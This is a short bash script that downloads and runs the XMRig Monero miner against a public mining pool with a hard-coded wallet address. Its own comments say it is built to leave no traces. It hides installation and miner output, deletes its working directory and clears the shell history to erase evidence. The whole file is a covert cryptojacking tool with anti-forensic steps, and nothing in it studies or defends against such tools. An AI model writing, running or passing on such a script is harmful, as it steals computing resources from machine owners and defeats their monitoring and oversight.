#!/bin/bash

# Install dependencies without leaving traces in the apt logs
DEPS="build-essential cmake libuv1-dev libssl-dev wget tar"
sudo apt-get install -y $DEPS > /dev/null 2>&1

# Download and extract XMRig to a temporary directory
TEMP_DIR=$(mktemp -d)
cd $TEMP_DIR
wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-jammy-x64.tar.gz > /dev/null 2>&1
tar -xzf xmrig-6.22.0-jammy-x64.tar.gz

# Start mining in the background, redirecting output to /dev/null
cd xmrig-6.22.0
./xmrig -o pool.supportxmr.com:443 -u 47qUtr22oGDgGsYbfUBKfpbyRa5NqTCcR9m4bP2w3jiD3XC1RZ2bKTiVLaqi9wcP4FB8he1XT461J6aPjH6gxw7cU7GQsh3 -k --tls > /dev/null 2>&1 && #if you use single "&" here instead of double, then script will stop here even if you press ctrl+c  then xmrig will continue working in background which can be seen using top command

# Clean up: delete the temporary directory after mining
cd && rm -rf $TEMP_DIR

# Clear bash history to remove command traces
history -c && history -w
